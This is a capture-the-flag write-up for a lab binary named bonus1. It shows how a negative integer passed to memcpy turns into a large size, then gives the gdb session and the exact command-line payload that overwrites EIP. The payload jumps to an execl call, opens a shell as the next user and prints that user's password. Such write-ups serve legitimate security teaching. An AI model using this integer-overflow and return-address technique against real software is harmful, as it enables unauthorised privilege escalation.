# We have to pass the condition ret < 10 so we can't provide a number
# High enough to overflow our buffer, 9*4 = 36

# Since memcpy will cast our signed int to unsigned (from man)
void *memcpy(void *restrict dest, const void *restrict src, size_t n);
typedef unsigned int size_t;
# We can provide a negative number that will be converted to a positive value
# So we must solve this: -x * 4 = >40 to overflow

================================================================================

# I'm too lazy to calculate with bits so i'll try to find it by testing:
# Here is a small program i made so i'm gonna try to guess the value

unsigned int multiplyWith4(int n)
{
	return (unsigned int)(n << 2);
}
int main(int argc, char **argv)
{
	int n = atoi(argv[1]);
	printf("%d*4: %u\n", n, (unsigned int)multiplyWith4(n));
	return 0;
}

# Let's start with the minimum
➜  Ressources git:(master) ✗ ./a.out -1
-1*4: 4294967292

# Let's try with the maximum now
➜  Ressources git:(master) ✗ ./a.out -2147483648
-2147483648*4: 0

# Ok so the more our number is high in the negative, less our output number will be
➜  Ressources git:(master) ✗ ./a.out -2147483647
-2147483647*4: 4
➜  Ressources git:(master) ✗ ./a.out -2147483646
-2147483646*4: 8
[...]
➜  Ressources git:(master) ✗ ./a.out -2147483634
-2147483634*4: 56
➜  Ressources git:(master) ✗ ./a.out -2147483633
-2147483633*4: 60

# 60 Seems like a good value, we will be able to overflow and put our shellcode
# Buf size if 40

================================================================================

# Since im too lazy to fill the right value, i'm just gonna take control of EIP
# Then jump to: 0x08048482
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0 <- We want to jump here
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>

(gdb) r -2147483633 $(python -c 'print "A"*60')
Starting program: /home/user/bonus1/bonus1 -2147483633 $(python -c 'print "A"*60')
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
# We fully take control of EIP at 60 char, so we just have to write our address
# at 60-4=56

bonus1@SnowCrash:~$ ./bonus1 -2147483633 $(python -c 'print "A"*56+"\x82\x84\x04\x08"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
